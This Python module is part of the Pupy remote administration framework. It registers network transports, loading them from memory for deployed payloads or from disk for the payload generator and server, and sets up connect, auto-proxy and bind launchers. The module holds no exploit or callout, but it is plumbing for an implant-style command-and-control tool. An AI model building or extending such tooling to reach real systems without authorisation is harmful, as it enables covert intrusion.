# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os, sys, logging, pkgutil, traceback
from .lib.launchers.connect import ConnectLauncher
from .lib.launchers.auto_proxy import AutoProxyLauncher
from .lib.launchers.bind import BindLauncher
import importlib

transports={}
launchers={}
def add_transport(module_name):
    try:
        confmodule=importlib.import_module("network.transports."+module_name+".conf")
        if not hasattr(confmodule,"TransportConf"):
            logging.error("No class TransportConf in transport network.transports.%s"%module_name)
            return
        t=confmodule.TransportConf
        if t.name is None:
            logging.warning("Transport %s has no defined attribute name. using package name as a fallback"%module_name)
            t.name=module_name

        transports[t.name]=t
        logging.debug("[+] transport %s loaded"%t.name)
    except Exception as e:
        logging.warning("Could not load transport %s : %s. Transport disabled"%(module_name,traceback.format_exc()))

   
#importing from memory (used by payloads)
try:
    import pupyimporter
    import network.transports
    for path in [x for x in pupyimporter.modules.iterkeys() if x.startswith("network/transports/") and x.endswith(("/conf.py","/conf.pyc"))]:
        try:
            module_name=path.rsplit('/',2)[1]
            add_transport(module_name)
        except Exception as e:
            pass
except Exception as e:
    import transports as trlib
    #imports for pupygen and the pupysh server
    for loader, module_name, is_pkg in pkgutil.iter_modules(trlib.__path__):
        add_transport(module_name)

launchers["connect"]=ConnectLauncher
launchers["auto_proxy"]=AutoProxyLauncher
launchers["bind"]=BindLauncher

